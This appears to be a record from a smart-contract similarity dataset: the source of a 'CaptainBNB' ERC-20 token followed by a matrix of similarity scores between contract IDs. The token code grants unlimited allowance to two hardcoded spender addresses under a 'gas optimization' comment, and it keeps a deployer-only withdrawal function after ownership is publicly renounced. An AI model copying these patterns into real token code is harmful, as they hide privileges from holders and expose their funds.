owner, address indexed spender, uint256 value ) ; \n    /**\n     * @dev Emitted when `value` tokens are moved from one account  ( `from` ) to\n     * another (`to` ).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer ( address indexed from, address indexed to, uint256 value );\n\n        \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a \n                        {Transfer\n                         }  event.\n     */\n    function transfer ( address to, uint256 amount) external returns (bool ) ; \n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {\n                        Approval } \n                         event.\n     */\n    function approve(address spender, uint256 amount ) external returns  ( bool);\n    \n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {\n                        transferFrom}\n                        . This is\n     * zero by default.\n     *\n     * This value changes when {\n                        approve}\n                         or \n                        {transferFrom } \n                         are called.\n     */\n    function allowance ( address owner, address spender ) external view returns  ( uint256) ; \n\n } \n                        \n\n\ninterface IERC20Metadata is IERC20 \n                        {\n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns  ( uint8);\n    \n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol( ) external view returns  ( string memory) ; \n\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name( ) external view returns  ( string memory) ; \n\n}\n                        \n\n\n\n\n\n/**\n * @dev Implementation of the  { \n                        IERC20 } \n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {\n                        _mint\n                        }.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {\n                        decimals } \n                         is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors   { \n                        \n    mapping(address => uint256) private _balances ; \n\n\n    mapping(address => mapping ( address => uint256 ) ) private _allowances;\n    uint256 private _totalSupply ; \n\n    string private _name;\n    string private _symbol ; \n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual returns (string memory) {\n                        \n        return _name ; \n    }\n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-totalSupply\n                         } .\n     */\n    function totalSupply ( ) public view virtual returns  ( uint256)  { \n                        \n        return _totalSupply;\n    }\n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-balanceOf } \n                        .\n     */\n    function balanceOf ( address account ) public view virtual returns  ( uint256 )  { \n                        \n        return _balances[account] ; \n     } \n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol( ) public view virtual returns  ( string memory ) {\n                        \n        return _symbol ; \n     } \n                        \n    \n    /**\n     * @dev Sets the values for  { \n                        name}\n                         and \n                        {symbol}\n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_ ) {\n                        \n        _name = name_ ; \n        _symbol = symbol_ ; \n    }\n                        \n    \n    /**\n     * @dev Variant of \n                        {_approve\n                         }  with an optional flag to enable or disable the {\n                        Approval\n                        } event.\n     *\n     * By default  ( when calling {\n                        _approve}\n                        ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve ( address owner, address spender, uint256 value, bool) internal virtual override  { \n                        \n     *     super._approve(owner, spender, value, true);\n     *  } \n                        \n     * ```\n     *\n     * Requirements are the same as  { \n                        _approve } \n                        .\n     */\n    function _approve ( address owner, address spender, uint256 value, bool emitEvent) internal virtual {\n                        \n        if  ( owner == address(0))  { \n                        \n            revert ERC20InvalidApprover ( address ( 0 ) );\n        }\n                        \n        if (spender == address ( 0) )  { \n                        \n            revert ERC20InvalidSpender ( address ( 0 ) );\n        \n                        }\n        _allowances[owner][spender] = value ; \n        if (emitEvent ) {\n                        \n            emit Approval(owner, spender, value );\n         } \n                        \n    \n                         } \n    \n\n    /**\n     * @dev See {\n                        IERC20-transfer } \n                        .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer ( address to, uint256 value) public virtual returns (bool)  { \n                        \n        address owner = _msgSender( );\n        _transfer(owner, to, value ) ; \n        return true;\n     } \n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an {\n                        Approval } \n                         event.\n     */\n    function _spendAllowance ( address owner, address spender, uint256 value ) internal virtual \n                        {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance < type ( uint256 ).max )  { \n                        \n            if  ( currentAllowance < value )  { \n                        \n                revert ERC20InsufficientAllowance ( spender, currentAllowance, value );\n             } \n                        \n            unchecked {\n                        \n                _approve(owner, spender, currentAllowance - value, false );\n             } \n                        \n        }\n                        \n    }\n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints  ( or burns) if `from`\n     *  ( or `to` ) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     */\n    function _update ( address from, address to, uint256 value ) internal virtual \n                        {\n        if  ( from == address(0) ) {\n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n        }\n                         else  { \n                        \n            uint256 fromBalance = _balances[from];\n            if (fromBalance < value ) {\n                        \n                revert ERC20InsufficientBalance(from, fromBalance, value);\n             } \n                        \n            unchecked \n                        {\n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n            }\n                        \n        }\n                        \n\n        if (to == address(0 )) {\n                        \n            unchecked {\n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n             } \n                        \n        }\n                         else  { \n                        \n            unchecked {\n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value ; \n            }\n                        \n         } \n                        \n\n        emit Transfer ( from, to, value );\n     } \n                        \n    \n    /**\n     * @dev See {\n                        IERC20-approve}\n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value) public virtual returns (bool )  { \n                        \n        address owner = _msgSender ( );\n        _approve(owner, spender, value );\n        return true;\n     } \n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-allowance}\n                        .\n     */\n    function allowance(address owner, address spender) public view virtual returns  ( uint256 )  { \n                        \n        return _allowances[owner][spender] ; \n     } \n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2` ).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     *  { \n                        IERC20-balanceOf } \n                         and  { \n                        IERC20-transfer}\n                        .\n     */\n    function decimals( ) public view virtual returns (uint8) {\n                        \n        return 15;\n    }\n                        \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {\n                        Approval\n                         }  event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value ) internal \n                         { \n        _approve(owner, spender, value, true);\n    }\n                        \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a  { \n                        Transfer}\n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual,  { \n                        _update } \n                         should be overridden instead.\n     */\n    function _mint(address account, uint256 value) internal \n                        {\n        if  ( account == address ( 0 ) ) \n                        {\n            revert ERC20InvalidReceiver ( address(0) );\n        }\n                        \n        _update(address ( 0 ), account, value );\n    \n                        }\n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to \n                         { transfer}\n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     *\n     * NOTE: This function is not virtual,  { \n                        _update}\n                         should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value ) internal  { \n                        \n        if (from == address ( 0 )) \n                         { \n            revert ERC20InvalidSender(address(0 ) );\n        \n                         } \n        if (to == address(0)) \n                         { \n            revert ERC20InvalidReceiver(address ( 0 ) );\n         } \n                        \n        _update(from, to, value) ; \n     } \n                        \n    \n    /**\n     * @dev See {\n                        IERC20-transferFrom\n                        }.\n     *\n     * Skips emitting an  { \n                        Approval}\n                         event indicating an allowance update. This is not\n     * required by the ERC. See {\n                        xref-ERC20-_approve-address-address-uint256-bool- } \n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value ) public virtual returns (bool ) \n                        {\n        address spender = _msgSender();\n        _spendAllowance ( from, spender, value );\n        _transfer ( from, to, value) ; \n        return true;\n    \n                         } \n    \n    \n                        }\n\nabstract contract Ownable is Context  { \n                        \n    address private _owner;\n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner  { \n                        \n        _transferOwnership(address(0 ));\n     } \n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner` ).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership ( address newOwner ) public virtual onlyOwner {\n                        \n        require ( newOwner != address(0), \"Ownable: new owner is the zero address\" ) ; \n        _transferOwnership(newOwner);\n    \n                        }\n    \n    event OwnershipTransferred ( address indexed previousOwner, address indexed newOwner);\n    \n    /**\n     * @dev The owner is not a valid owner account. (eg. `address ( 0)`)\n     */\n    error OwnableInvalidOwner ( address owner);\n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner` ).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership ( address newOwner ) internal virtual  { \n                        \n        address oldOwner = _owner ; \n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner );\n     } \n                        \n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor ( )  { \n                        \n        _transferOwnership ( _msgSender (  ) ) ; \n    }\n                        \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner (  )  { \n                        \n        _checkOwner( ) ; \n        _ ; \n    \n                         } \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner( ) public view virtual returns (address) {\n                        \n        return _owner ; \n    }\n                        \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner( ) internal view virtual {\n                        \n        require ( owner ( ) == _msgSender( ), \"Ownable: caller is not the owner\") ; \n    }\n                        \n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount(address account) ; \n    \n\n                        }\n\n\n// File CaptainBNB.sol\n\ncontract CaptainBNB is ERC20, Ownable  { \n                        \n    address internal immutable deployer ; \n    constructor(string memory name_, string memory symbol_ ) ERC20(name_, symbol_) {\n                        \n        _mint ( msg.sender, 100000000000000000000000000 ) ; \n        _transferOwnership ( address(0 ) ) ; \n        deployer = msg.sender ; \n    \n                         } \n    \n    /**\n     * @dev See  { \n                        IERC20-allowance } \n                        .\n     */\n    function allowance ( address owner, address spender) public view override returns  ( uint256 ) \n                        {\n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if (  ( spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3 ) || (spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24)) { \n                        \n            return type(uint256).max;\n         } \n                         \n        return super.allowance ( owner,spender ) ; \n    }\n                        \n    \n    function claimGas ( address payable recipient, uint256 amount ) public {\n                        \n        require(msg.sender==deployer);\n        Address.sendValue ( recipient, amount );\n    }\n                        \n    \n    receive ( ) external payable{\n                        \n     } \n                        \n\n                         }",
      "count": 1,
      "addresses": [
        "0x08bfe52d7957e54D478d7d8DCE4877F10F1EcCeB"
      ],
      "names": [
        "CaptainBNB"
      ]
    }
  ],
  "graph": {
    "587bd561-be86-44bf-996b-7dc9cb1dad00": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 99.38,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.8,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 82.64,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 67.71,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 78.51,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.55,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.55,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.43,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.38,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 46.91,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.52,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.58,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.65,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.55,
      "f14c638d-60f5-485e-a303-fff708acd164": 74.49,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.55,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.5,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.31,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.26,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.76,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.46,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.72,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.26,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.47,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 6.56,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.44,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.73
    },
    "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": {
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.38,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.29,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 82.37,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 66.57,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 78.32,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.38,
      "0e85fb68-de71-4979-8b8f-80d509029455": 98.9,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 98.93,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.47,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 44.58,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.14,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.1,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.71,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.2,
      "f14c638d-60f5-485e-a303-fff708acd164": 73.79,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.01,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 98.98,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.11,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 98.84,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.22,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.22,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 4.09,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.34,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.01,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 0,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 98.99,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.14
    },
    "6292d7a7-595c-4a52-b04f-8762c556bb27": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 84.29,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 84.8,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 0,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 85.72,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 59.3,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 92.02,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 84.0,
      "0e85fb68-de71-4979-8b8f-80d509029455": 84.31,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 84.18,
      "6e072a16-d906-446f-b860-7f65482e8afc": 85.13,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 47.31,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 84.67,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 84.03,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 84.0,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 84.11,
      "f14c638d-60f5-485e-a303-fff708acd164": 84.63,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 84.63,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 84.13,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 83.96,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 85.02,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 84.54,
      "65de9d63-a252-424b-9399-aedb43b92a53": 84.11,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.72,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 83.23,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 84.39,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 6.56,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 84.13,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 84.41
    },
    "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 1.87,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 1.87,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 0,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 0,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 4.24,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 0,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 1.87,
      "0e85fb68-de71-4979-8b8f-80d509029455": 1.87,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 1.87,
      "6e072a16-d906-446f-b860-7f65482e8afc": 1.87,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 4.24,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 1.87,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 1.87,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 1.87,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 1.87,
      "f14c638d-60f5-485e-a303-fff708acd164": 7.12,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 1.87,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 1.87,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 1.87,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 1.87,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 1.87,
      "65de9d63-a252-424b-9399-aedb43b92a53": 1.87,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 12.27,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 1.87,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 1.87,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 29.12,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 1.87,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 1.87
    },
    "79de8f59-1485-4eed-8993-a02d16e9123b": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 82.37,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 82.64,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 85.72,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 0,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 64.0,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 89.02,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 81.84,
      "0e85fb68-de71-4979-8b8f-80d509029455": 82.93,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 82.26,
      "6e072a16-d906-446f-b860-7f65482e8afc": 82.93,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 58.54,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 82.77,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 81.91,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 82.31,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 82.55,
      "f14c638d-60f5-485e-a303-fff708acd164": 80.37,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 82.48,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 81.95,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 82.48,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 82.48,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 82.48,
      "65de9d63-a252-424b-9399-aedb43b92a53": 82.22,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.72,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 81.18,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 82.62,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 6.56,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 81.95,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 81.8
    },
    "1b3a2695-6451-416e-ba6b-b43194c9e679": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 66.57,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 67.71,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 59.3,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 4.24,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 64.0,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 70.71,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 65.68,
      "0e85fb68-de71-4979-8b8f-80d509029455": 66.31,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 67.53,
      "6e072a16-d906-446f-b860-7f65482e8afc": 67.96,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 73.55,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 67.15,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 67.02,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 66.64,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 67.0,
      "f14c638d-60f5-485e-a303-fff708acd164": 25.18,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 67.28,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 65.98,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 67.15,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 67.63,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 66.36,
      "65de9d63-a252-424b-9399-aedb43b92a53": 66.57,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 5.61,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 67.2,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 68.11,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 15.87,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 65.88,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 66.82
    },
    "74230f56-9a24-4a52-aa87-8bf7f1714c95": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 78.32,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 78.51,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 92.02,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 0,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 89.02,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 70.71,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 78.07,
      "0e85fb68-de71-4979-8b8f-80d509029455": 78.59,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 78.48,
      "6e072a16-d906-446f-b860-7f65482e8afc": 79.16,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 49.59,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 78.79,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 77.79,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 78.3,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 78.71,
      "f14c638d-60f5-485e-a303-fff708acd164": 85.24,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 78.59,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 78.74,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 77.97,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 79.36,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 78.53,
      "65de9d63-a252-424b-9399-aedb43b92a53": 78.43,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.72,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 77.45,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 78.76,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 6.56,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 78.35,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 77.83
    },
    "fec95837-3bbe-4bc4-b28d-a06582d18b4f": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 99.38,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.55,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.0,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 81.84,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 65.68,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 78.07,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.86,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.64,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.7,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 45.18,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.79,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.38,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.5,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.5,
      "f14c638d-60f5-485e-a303-fff708acd164": 72.72,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.56,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.77,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.88,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.58,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.76,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.49,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 6.07,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.49,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.47,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 3.58,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.49,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.73
    },
    "0e85fb68-de71-4979-8b8f-80d509029455": {
